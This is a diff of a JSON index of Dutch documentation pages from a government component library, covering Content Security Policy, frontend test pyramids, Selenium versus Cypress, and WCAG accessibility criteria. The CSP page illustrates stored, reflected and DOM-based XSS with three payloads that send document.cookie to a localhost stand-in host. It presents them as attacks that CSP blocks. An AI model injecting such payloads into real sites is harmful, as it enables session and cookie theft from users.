+            "added": "# Wat Is CSP\n\n## Inleiding\n\nContent Security Policy (CSP) is een beveiligingsmechanisme, te configureren in de HTTP-headers van je webapplicatie.\nHet bepaalt welke bronnen (scripts, styles, afbeeldingen, fonts, iframes, etc.) een browser mag laden en\nuitvoeren.\n\nCSP is ontworpen om aanvallen als Cross-Site Scripting (XSS) en data-injectie te voorkomen. Zonder CSP kan een aanvaller\nkwaadaardige inline scripts of externe bestanden injecteren en uitvoeren. Met CSP kun je dat beperken tot expliciet\nvertrouwde bronnen.\n\n - Je kunt per type bron (script, style, img, font, frame, …) aangeven wat wél en niet mag.\n - Inline scripts / styles worden standaard geblokkeerd, tenzij je ze expliciet toestaat (met 'unsafe-inline', nonces of\n   hashes).\n - CSP maakt het veel moeilijker voor aanvallers om via XSS code uit te voeren, de browser weigert alle ongeautoriseerde\n   content.\n\nCSP is een extra beveiligingslaag bovenop secure coding en inputvalidatie. Het doel is niet alleen aanvallen te\nblokkeren, maar ook om het aanvalsoppervlak te verkleinen en fouten sneller zichtbaar te maken tijdens ontwikkeling.\n\n## Cross Side Scripting\n\nEén van de belangrijkste zaken waartegen je je kan beschermen met CSP is tegen Cross Side Scripting (XSS). Een uitleg\nvan wat XSS is vind je in het artikel [cross site scripting xss](https://auth0.com/blog/cross-site-scripting-xss), hoe\nje je dan met CSP daartegen kan beschermen staat uitgelegd in\n[defending against xss with csp](https://auth0.com/blog/defending-against-xss-with-csp). Voor toepassingen die een SPA\nopzet volgen is er het specifiekere artikel [deploying csp in spa](https://auth0.com/blog/deploying-csp-in-spa).\n\nHet hoofddoel om CSP te activeren is om te zorgen dat een webtoepassing enkel eigen, vertrouwde code bevat en uitvoert.\nEnkel de eigen geschreven / voorziene javascript, html en css mag getoond en uitgevoerd worden. Wijzigen, tonen of\nuitvoeren van 'andere' code wordt afgeblokt.\n\nVoorbeelden van XSS, die tegengehouden wordt, zijn:\n\n### Stored XSS tegenhouden\n\nIn input velden zou malicious code ingevoerd kunnen worden conform:\n\n```\n<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>\n```\n\nAls deze code dan (denk bvb. in het geval van een blog) door een andere gebruiker geopend en uitgevoerd wordt kunnen er\nongewenst gegevens gecapteerd worden.\n\n### Reflected XSS tegenhouden\n\nLinks (aangeboden via een href of verborgen via een shortening service) die refereren naar een toepassing kunnen\nscripts bevatten:\n\n```\nhttp://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E\n```\n\n### DOM based XSS tegenhouden\n\nIn de DOM kan (door via een malicious website omgeleid te zijn) geldige, maar kwaadwillige html gestoken zijn.\n\n```\n<img src=\"noimage\" onerror=fetch(`http://localhost:4000?data=${document.cookie}`)/>\n```\n\n### CSS XSS tegenhouden\n\nZie het filmpje en de presentatie op [xss no the other s](https://mikewest.org/2013/09/xss-no-the-other-s-cssconfeu-2013)."
+          },
+          {
+            "id": "richtlijnen-testen-klassieke-test-piramide--documentatie",
+            "title": "Richtlijnen/Testen/Klassieke Test Piramide",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-testen-klassieke-test-piramide--documentatie",
+            "added": "# Klassieke Test Piramide\n\n<br/>\n<img src={klassiekeTestPiramide} alt=\"Klassieke Test Piramide\" height=\"350px\"/>\n<br/>\n<br/>\n\nDe meest simpele variant van de test piramide gaat op voor alle type toepassingen. Het is het minimale wat dient te\ngebeuren rond testen, de feitelijke uitvoering ligt open. Volgende concepten zitten vervat in de piramide:\n\n- het doel is minimale overlap te hebben tussen de niveaus: wat al getest is op een lager niveau dient niet meer getest\n  te worden op een hoger niveau\n- naarmate je dichter bij de top komt\n  * stijgt de complexiteit van de testen\n  * stijgt de implementatie tijd\n  * stijgt de doorlooptijd van uitvoering\n  * daalt de hoeveelheid van 'dat' type testen\n\n> **conceptueel: probeer 'wat' je wil testen zo laag als mogelijk in de piramide te doen**"
+          },
+          {
+            "id": "richtlijnen-testen-selenium-en-cypress--documentatie",
+            "title": "Richtlijnen/Testen/Selenium en Cypress",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-testen-selenium-en-cypress--documentatie",
+            "added": "# Selenium en Cypress\n\n## Inleiding\n\nBij Departement Omgeving wordt typisch Selenium gebruikt voor frontend testen. Selenium wordt algemeen veel gebruikt,\nis goed gedocumenteerd, maar niet ideaal. Het artikel\n[cypress, the selenium killer](https://blog.logrocket.com/cypress-io-the-selenium-killer/) beschrijft de problemen die\nik typisch ook ervaar met Selenium.\n\n\n## Selenium\n\nEen aantal algemene artikels die Selenium goed beschrijven zijn:\n\n- de [Selenium website](https://www.selenium.dev)\n- de [Selenium wikipedia](https://en.wikipedia.org/wiki/Selenium_(software)) pagina\n- een [introductie tot Selenium](https://www.guru99.com/introduction-to-selenium.html)\n\nSelenium heeft een [flexibele architectuur](https://www.interviewbit.com/blog/selenium-architecture) met web-driver's\nwaardoor het historisch een breed scala van talen (om testen in te schrijven) en browsers ondersteund. Typisch werden\ndeze testen (vroeger in [SSR toepassingen](/docs/applicatief-testen-test-piramide-ssr-vs-spa--documentatie)) in dezelfde taal als de\napplicatie (bij DOMG dus in Java) geschreven. Toepassingen zijn geëvolueerd richting SPA's, in JavaScript geschreven.\nDaar Selenium ook JavaScript ondersteuning heeft is dan vaak die test tool behouden. In de opzet van een SPA zijn er\nechter betere alternatieven.\n\n\n## Eenduidigheid\n\nVolgende factoren maken het minder eenduidig wat er in de DOM gebeurt:\n\n- bij een responsive toepassing zullen afhankelijk van de resolutie waarop getest wordt elementen onzichtbaar worden,\n  een ander formaat of andere positie hebben\n- door web-componenten met een shadow DOM is de DOM-structuur minder transparant\n- frameworks en component bibliotheken doen soms auto-magische zaken\n\n\n## Selenium en SPA's\n\n### Page Object Model\n\nDe [POM](https://www.selenium.dev/documentation/test_practices/encouraged/page_object_models/) aanpak die vaak\ngebruikt wordt is zinvol voor SSR's, je hebt verschillende pagina's met hun eigen url. Er is een 1 op 1 mapping\nvan de pagina met het POM. Voor een SPA is dat lastiger, er is maar 1 page waarbinnen alles dynamisch gebeurt.\nVasthouden aan het POM kan, maar zal niet eenduidig zijn.\n\n\n## Cypress\n\nAlle informatie hierover is te vinden op de [Cypress detail](/docs/bijdragen-cypress--documentatie) pagina."
+          },
+          {
+            "id": "richtlijnen-testen-technische-test-aanpak-frontend--documentatie",
+            "title": "Richtlijnen/Testen/Technische Test Aanpak Frontend",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-testen-technische-test-aanpak-frontend--documentatie",
+            "added": "# Technische Test Aanpak Frontend\n\n## Unit Testen\n\nJest\n\n\n## Component Testen\n\nCypress & Storybook\n\n\n## Te Vermijden: Flaky Testen\n\n[Flaky testen](https://dev.to/codux/flaky-tests-and-how-to-deal-with-them-2id2) zijn testen die typisch lukken,\nmaar 'soms' niet. De soms hangt af van randvoorwaarden als: de snelheid van de computer waar de testen / de toepassing\nop draaien, extra belastingen van het systeem, een trager netwerk, ... .\nDes te dynamischer toepassingen worden, des te flaky-er testen worden. De oorzaak is nooit het test framework,\neen tool die de problematiek echter in acht neemt kan de flakiness wel beperken en beheersbaar maken.\n\nOorzaken van flakiness zijn vaak asynchrone gebeurtenissen:\n\n- door het gebruik van promises, async/await, observables (RxJS)<br/>\n-> eventueel ten gevolge van het maken van een reactive toepassing\n- events die gebeuren vanuit de server kant: via SSE of een websocket\n\n\n## Timing Problemen\n\nSelenium stamt uit 2004, een tijd waar de aanpak om een webtoepassing te schrijven was: het dynamisch maken van\nmeerdere statische pagina's. Als het dynamische er uit bestaat te antwoorden met een volledig nieuwe pagina werkt\nSelenium perfect: het selecteren en verifiëren van aanwezige DOM elementen lukt feilloos. Vanaf dat er AJAX\n(Asynchronous JavaScript And XML) gebruikt werd, lag het al moeilijker. De feitelijke DOM-structuur wijzigt dan\nten gevolge van gebruiker acties. Doordat AJAX bewust en gecontroleerd gebruikt werd, viel het nog wel mee om\neen Selenium test te schrijven. Je gebruikt typisch het patroon: wachten tot 'iets verwacht' gebeurt, om daarna\nverder te gaan.\n\nBij een SPA is het echter minder eenduidig wat er in de DOM gebeurt, zie hiervoor de uitgebreidere uitleg m.b.t.\n[eenduidigheid](/docs/richtlijnen-testen-selenium-en-cypress--documentatie#eenduidigheid)."
+          },
+          {
+            "id": "richtlijnen-testen-test-piramide-component-bibliotheek--documentatie",
+            "title": "Richtlijnen/Testen/Test Piramide Component Bibliotheek",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-testen-test-piramide-component-bibliotheek--documentatie",
+            "added": "# Test Piramide Component Bibliotheek\n\n## Inleiding\n\nHet Flux-team bouwt een component bibliotheek, dit is verschillend van een eindtoepassing. Om die componenten afgebakend\nte testen wordt de algemene test aanpak gevolgd met een specifieke invulling.\n\n\n## Variant op de SPA Test Piramide\n\nDe test piramide voor de component bibliotheek volgt de\n[klassieke test piramide](/docs/applicatief-testen-klassieke-test-piramide--documentatie) en is een variant op de\n[SPA test piramide](/docs/applicatief-testen-test-piramide-ssr-vs-spa--documentatie).\n\n<br/>\n<img src={cbTestPiramide} alt=\"Component Bibliotheek Test Piramide\" height=\"450px\"/>\n<br/><br/>\n\nOm de component bibliotheek te testen zijn volgende keuzes gemaakt:\n\n- de code wordt in [TypeScript](https://www.typescriptlang.org/) geschreven zodat we een stabiele basis verkrijgen die\n  o.a. refactorings minder fout gevoelig maakt\n- er zijn minimale unit testen, enkel daar waar 'logica' zit die onafhankelijk is van visualisatie (html / css) -\n  bvb. in de map actions\n  <br/>-> net omdat er geen business logica hoort te zitten in UI-componenten\n- de focus ligt op visuele component testen, hiervoor worden de componenten geïntegreerd in\n  [Storybook](https://storybook.js.org/)\n- Storybook geeft een 3 in 1 voordeel: de component wordt echt geïntegreerd - inclusief varianten - in een toepassing\n  (Storybook) die de documentatie (visueel raadpleegbaar) vormt van diezelfde component; na de integratie worden dan\n  de testen geschreven (2-staps proces)\n- een beperkt aantal componenten is een compositie van andere componenten, de testen daarvoor kunnen gezien worden als\n  component-integratie testen; omdat dat echter zelf een component is zien we dat als gewone component testen, hierdoor\n  zijn er dus geen integratie testen\n- e2e-testen zijn er niet, de component bibliotheek bevat bouwstenen, dat is het finale product\n- de bibliotheek wordt aangeboden via verschillende artefacts, om de garantie te hebben dat die artefacts afneembaar\n  zijn door andere teams is er de Consumer toepassing - die technisch op dezelfde manier de artefacts integreert zoals\n  een toepassing dat doet - de testen daarvoor zijn de 'artefact integratie testen'"
+          },
+          {
+            "id": "richtlijnen-testen-test-piramide-ssr-vs-spa--documentatie",
+            "title": "Richtlijnen/Testen/Test Piramide SSR vs SPA",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-testen-test-piramide-ssr-vs-spa--documentatie",
+            "added": "# Test Piramide: SSR vs SPA\n\n## SRR vs SPA\n\n<br/>\n<img src={ssrVsSpa} alt=\"Ssr vs Spa\" height=\"450px\"/>\n\n\n## Testen van een SSR\n\nVroeger werden toepassingen typisch gebouwd als server-side rendering applicaties. Voor hedendaagse toepassingen die\ndichter aanleunen bij een website dan bij een complexere webtoepassing kan SSR nog steeds de voorkeur genieten.\nVeel toepassingen bij Departement Omgeving zijn als SSR-toepassing geschreven. De frontend werkt dan niet onafhankelijk\nvan de backend maar zit erin vervat, het is een backend gestuurde toepassing. Er zullen unit en integratie testen zijn,\nmaar hoofdzakelijk voor de Java code die eerder backend gefocused is. Voor de frontend testen is het dan zinvol je te\nbeperken tot e2e-testen. Die e2e-testen zijn dan wel de enige frontend testen en zouden dan best zowel het happy\nals (beperkt) het unhappy pad moeten afdekken. Logica zal zich eerder in de Java code bevinden, niet alle varianten van\ngeldige en ongeldige input dient dus via de frontend afgetest te worden daar dit al op een lager niveau in de piramide\ngetest werd.\n\nVoor een SSR-toepassing ziet de test piramide er conceptueel als volgt uit:\n<img src={ssrTestPiramide} alt=\"Ssr Test Piramide\" height=\"350px\"/>\n<br/>\n\nDe feitelijke backend test aanpak kan fijner uitgetekend worden, dit is echter buiten de scope van dit document (dat\nzich beperkt tot frontend).\n\n\n## Testen van een SPA\n\nVoor complexere web toepassingen heeft de\n[Single Page Application](https://nl.wikipedia.org/wiki/Single_Page_Application) aanpak de voorkeur. Een SPA kan je\nzien als een volwaardige toepassing die eenmalig ingeladen wordt in de browser (of aanwezig is op bvb. een tablet) en\ncommuniceert met 1 (of meerdere) backends. In tegenstelling tot een SSR kan je om een SPA te testen wel de volledige\ntest piramide in beschouwing nemen. Een uitgebreidere uitleg hierover vind je in het Medium artikel\n[Testing Single Page Applications](https://medium.com/inspiredbrilliance/testing-single-page-applications-b4001adc6452),\neventueel vind je <a href=\"testing-single-page-applications-medium.pdf\" target=\"_blank\">hier</a> een kopie.\n\nSamengevat komt het erop neer dat een goed geschreven SPA uit onderdelen bestaat die op test vlak alliëren met de lagen\nvan de test piramide:\n- functionele logica - ongerelateerd aan UI zaken - zit afgebakend, hier tegenover worden unit testen geschreven\n- basis (herbruikbare) UI-functionaliteit zit in componenten, daar worden component testen voor geschreven - er\n  dient een opzet voorzien te worden om componenten standalone te kunnen testen\n- componenten kunnen gegroepeerd worden, denk bvb. aan complexere formulieren of wizards, die kan je geïntegreerd\n  testen (component integratie testen)\n- afhankelijk van de maturiteit al dan niet in combinatie met een framework kan de toepassing in modules opgesplitst\n  worden, een module (die bestaat uit een store, een router, componenten, ...) kan onafhankelijk van andere modules\n  getest worden, dit zijn dan ook integratie testen\n- de feitelijke eindtoepassing kan je e2e testen, afhankelijk van de kwaliteit van de backend en de team-samenstelling\n  kan je e2e testen t.o.v. een draaiende backend of opteren om de backend-calls te mocken\n\nBij een SPA zit er meer code en logica in de frontend dan bij een SSR-toepassing. Daar er echter met een scripting taal\ngewerkt wordt is het aan te bevelen een extra kwaliteitslaag toe te voegen: een linter of een transpiler. In de backend\nheb je - vaak zonder te beseffen - een compiler die er voor zorgt dat de code die je test minstens 'loopt'. In de\nfrontend heb je die garantie niet, door bvb. in [TypeScript](https://www.typescriptlang.org/) te werken en een\ntranspiler toe te voegen verhoog je dus met een minimale inspanning al de kwaliteit.\n\nVoor een SPA ziet de volledige test piramide er als volgt uit:\n\n<img src={spaTestPiramide} alt=\"Spa Test Piramide\" height=\"450px\"/>\n\n> Dit lijkt mogelijks nodeloos 'gelaagd' of 'complex' maar is het niet. Een transpiler / linter (wat optioneel is maar\naanbevolen wordt) maakt deel uit van het ontwikkel / build proces (net zoals bij Java ontwikkeling). Unit testen zijn\ntypisch beperkt, de overige testen (component / component integratie / e2e) kan je zo opzetten dat het technische\nvarianten zijn; zodat ze praktisch niet aanvoelen als een ander type test.\n\n> 1 van de doelen van een SPA is de backend simpeler, eenduidiger en meer stateless te maken. Hierdoor\nverschuift een deel van de logica en complexiteit naar de frontend. Er zal dus meer getest worden in de frontend,\nmaar minder in de backend t.o.v. een SSR-toepassing."
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-1-tekstalternatieven--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/1. Waarneembaar/1.1 Tekstalternatieven",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-1-tekstalternatieven--documentatie",
+            "added": "(121 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-2-op-tijd-gebaseerde-media--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/1. Waarneembaar/1.2 Op tijd gebaseerde media",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-2-op-tijd-gebaseerde-media--documentatie",
+            "added": "    FluxWcagSuccesscriterium\n} from '../../../../.storybook/flux-wcag/flux-wcag-succescriterium';\n\n\n<FluxWcagRichtlijn\n    level=\"1.2\"\n    title=\"Op tijd gebaseerde media (beeld, geluid en video)\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#time-based-media\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#time-based-media\"\n    text={\n        <>\n            Dit is media met een bepaalde tijdsduur, zoals beelden, geluiden en video.\n            <div style={{marginTop: '6px'}}/>\n            Er zijn gebruikers die geen beelden zien of geluiden horen. Zorg ervoor dat zij op een andere manier de\n            inhoud van beelden, geluiden en video’s meekrijgen.\n        </>\n    }\n>\n\n<FluxWcagBronsPlus></FluxWcagBronsPlus>\n\n<FluxWcagSuccesscriterium\n    title=\"Louter-geluid en louter-videobeeld (vooraf opgenomen)\"\n    level=\"1.2.1\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#audio-only-and-video-only-prerecorded\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#audio-only-and-video-only-prerecorded\"\n    text={\n        <>\n            Bijvoorbeeld een MP3-bestand, podcast, video zonder geluid\n            <div style={{marginTop: '6px'}}/>\n            Voorzie <strong>inhoud met alleen geluid of alleen video</strong> van een audiobeschrijving of een\n            tekstversie. Zo krijgen gebruikers die moeilijk of niet zien of horen de informatie ook mee.\n        </>\n    }\n>\n\n<FluxWcagSuccesscriterium\n    title=\"Ondertitels voor doven en slechthorenden (vooraf opgenomen)\"\n    level=\"1.2.2\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#captions-prerecorded\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#captions-prerecorded\"\n    text={\n        <>\n            Bijvoorbeeld een interview.\n            <div style={{marginTop: '6px'}}/>\n            Geef <strong>video’s die op voorhand zijn opgenomen ondertiteling</strong>. Zo krijgen gebruikers die\n            moeilijk of niet horen de informatie ook mee.\n        </>\n    }\n>\n\n<FluxWcagSuccesscriterium\n    title=\"Audiodescriptie of media-alternatief (vooraf opgenomen)\"\n    level=\"1.2.3\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#audio-description-or-media-alternative-prerecorded\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#audio-description-or-media-alternative-prerecorded\"\n    text={\n        <>\n            Bijvoorbeeld een instructievideo.\n            <div style={{marginTop: '6px'}}/>\n            Geef <strong>vooraf opgenomen video een audiobeschrijving</strong>. Of zet wat er te horen en te zien is om\n            in een uitgeschreven tekst. Een ander woord daarvoor is een transcript. Zo krijgen gebruikers die moeilijk\n            of niet zien informatie die anders alleen met de ogen te zien is ook mee.\n        </>\n    }\n>\n\n<FluxWcagSilverPlus></FluxWcagSilverPlus>\n\n<FluxWcagSuccesscriterium\n    title=\"Ondertitels voor doven en slechthorenden (live)\"\n    level=\"1.2.4\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#captions-live\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#captions-live\"\n    text={\n        <>\n            Bijvoorbeeld een videoconferentie.\n            <div style={{marginTop: '6px'}}/>\n            Geef <strong>live video ondertiteling</strong>.\n        </>\n    }\n>\n\n<FluxWcagSuccesscriterium\n    title=\"Audiodescriptie (vooraf opgenomen)\"\n    level=\"1.2.5\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#audio-description-prerecorded\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#audio-description-prerecorded\"\n    text={\n        <>\n            Geef <strong>op voorhand opgenomen video een audiobeschrijving</strong>. Zo krijgen gebruikers die moeilijk\n            of niet zien informatie die anders alleen met de ogen te zien is ook mee.\n            <div style={{marginTop: '6px'}}/>\n            Richtlijn 1.2.5 is strikter dan 1.2.3, onder 1.2.3 mag je kiezen: een audiodescriptie of een\n            media-alternatief. Als je kiest voor de audiodescriptie voldoe je ineens aan 1.2.5.\n        </>\n    }\n>"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-3-aanpasbaar--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/1. Waarneembaar/1.3 Aanpasbaar",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-3-aanpasbaar--documentatie",
+            "added": "(263 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-4-onderscheidbaar--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/1. Waarneembaar/1.4 Onderscheidbaar",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-1-4-onderscheidbaar--documentatie",
+            "added": "(205 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-overzicht--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/1. Waarneembaar/Overzicht",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-1-waarneembaar-overzicht--documentatie",
+            "added": "(113 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-1-toetsenbordtoegankelijk--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/2. Bedienbaar/2.1 Toetsenbordtoegankelijk",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-1-toetsenbordtoegankelijk--documentatie",
+            "added": "<FluxWcagRichtlijn\n    level=\"2.1\"\n    title=\"Toetsenbordtoegankelijk\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#keyboard-accessible\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#keyboard-accessible\"\n    text={\n        <>\n            Alles wat gebruikers op de website kunnen doen, moet ze ook kunnen als ze alleen een toetsenbord gebruiken.\n        </>\n    }\n>\n\n<FluxWcagBronsBase></FluxWcagBronsBase>\n\n<FluxWcagSuccesscriterium\n    title=\"Toetsenbord\"\n    level=\"2.1.1\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#keyboard\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#keyboard\"\n    text={\n        <>\n            Zorg dat alles wat gebruikers kunnen zien en gebruiken <strong>ook te bereiken en te bedienen met alleen een\n            toetsenbord</strong> is, bijvoorbeeld formulieren, menu’s of een winkelwagentje.\n            <div style={{marginTop: '6px'}}/>\n            Zo kunnen ook mensen zonder muis doen wat de bedoeling is. Sommige mensen hebben niet genoeg controle of\n            kracht in hun hand om een muis te gebruiken.\n        </>\n    }\n>\n\n<FluxWcagSuccesscriterium\n    title=\"Geen toetsenbordval\"\n    level=\"2.1.2\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#no-keyboard-trap\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#no-keyboard-trap\"\n    text={\n        <>\n            Zorg er voor dat iedereen ook met een toetsenbord de logische opbouw van je website kan gebruiken.\n            <div style={{marginTop: '6px'}}/>\n            Is er een onderdeel waar gebruikers naartoe moeten kunnen? Dan moeten ze daar met het <strong>toetsenbord\n            kunnen geraken en ook weer weg kunnen</strong>.\n            <div style={{marginTop: '6px'}}/>\n            Voorkom dus dat mensen die alleen een toetsenbord gebruiken niet verder kunnen en vast komen te zitten. In\n            andere woorden: een valkuil door het toetsenbord.\n        </>\n    }\n>\n\n<FluxWcagBronsPlus></FluxWcagBronsPlus>\n\n<FluxWcagSuccesscriterium\n    title=\"Enkel teken sneltoetsen\"\n    level=\"2.1.4\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#character-key-shortcuts\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#character-key-shortcuts\"\n    text={\n        <>\n            Zorg dat gebruikers sneltoetsen zelf kunnen instellen als je website sneltoetsen heeft. Sommige sneltoetsen\n            zijn niet voor iedereen handig of makkelijk.\n            <div style={{marginTop: '6px'}}/>\n            Daarom moeten gebruikers ze kunnen <strong>uitzetten en opnieuw toewijzen</strong>. Verder mag een sneltoets\n            voor een onderdeel alleen actief zijn wanneer dat onderdeel de focus heeft.\n        </>\n    }\n>"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-2-genoeg-tijd--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/2. Bedienbaar/2.2 Genoeg tijd",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-2-genoeg-tijd--documentatie",
+            "added": "<FluxWcagRichtlijn\n    level=\"2.2\"\n    title=\"Genoeg tijd\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#enough-time\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#enough-time\"\n    text={\n        <>\n            Geef gebruikers genoeg tijd om je inhoud te lezen, begrijpen en gebruiken.\n        </>\n    }\n>\n\n<FluxWcagBronsPlus></FluxWcagBronsPlus>\n\n<FluxWcagSuccesscriterium\n    title=\"Timing aanpasbaar\"\n    level=\"2.2.1\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#timing-adjustable\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#timing-adjustable\"\n    text={\n        <>\n            Heb je inhoud die alleen tijdelijk beschikbaar is? Bijvoorbeeld inhoud die verloopt of niet meer te\n            gebruiken is na een bepaalde tijd, zoals een formulier dat je binnen een bepaalde tijd moet invullen?\n            <div style={{marginTop: '6px'}}/>\n            Zorg er dan voor dat gebruikers kunnen <strong>aanpassen hoe lang de inhoud beschikbaar is</strong>. Zo\n            krijgt iedereen genoeg tijd om informatie te lezen en te begrijpen.\n        </>\n    }\n>\n\n<FluxWcagSuccesscriterium\n    title=\"Pauzeren, stoppen, verbergen\"\n    level=\"2.2.2\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#pause-stop-hide\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#pause-stop-hide\"\n    text={\n        <>\n            Bijvoorbeeld animaties, video’s, knipperende tekst, fotocarrousel.\n            <div style={{marginTop: '6px'}}/>\n            Geef gebruikers de mogelijkheid om <strong>inhoud die langer dan vijf seconden automatisch\n            beweegt</strong> op pauze te zetten, te stoppen of te verbergen. Zo leid je mensen die zich moeilijker\n            kunnen focussen en concentreren niet af.\n        </>\n    }\n>"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-3-toevallen-en-fysieke-reacties--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/2. Bedienbaar/2.3 Toevallen en fysieke reacties",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-3-toevallen-en-fysieke-reacties--documentatie",
+            "added": "<FluxWcagRichtlijn\n    level=\"2.3\"\n    title=\"Toevallen en fysieke reacties\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#seizures-and-physical-reactions\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#seizures-and-physical-reactions\"\n    text={\n        <>\n            Maak geen inhoud die aanvallen van epilepsie of andere lichamelijke reacties kan uitlokken. Zorg voor een\n            veilig ontwerp.\n        </>\n    }\n>\n\n<FluxWcagBronsPlus></FluxWcagBronsPlus>\n\n<FluxWcagSuccesscriterium\n    title=\"Drie flitsen of beneden drempelwaarde\"\n    level=\"2.3.1\"\n    refDescription=\"https://www.w3.org/Translations/WCAG22-nl/#three-flashes-or-below-threshold\"\n    refQuick=\"https://www.w3.org/WAI/WCAG22/quickref/?showtechniques=111%2C121#three-flashes-or-below-threshold\"\n    text={\n        <>\n            Zorg ervoor dat je inhoud <strong>niet meer dan drie keer per seconde flitst of knippert</strong>. Zo\n            bescherm je mensen met aandoeningen zoals lichtgevoelige epilepsie tegen aanvallen.\n        </>\n    }\n>"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-4-navigeerbaar--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/2. Bedienbaar/2.4 Navigeerbaar",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-4-navigeerbaar--documentatie",
+            "added": "(220 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-toegankelijkheid-aanpak-2-bedienbaar-2-5-input-modaliteiten--documentatie",
+            "title": "Richtlijnen/Toegankelijkheid - Aanpak/2. Bedienbaar/2.5 Input modaliteiten",
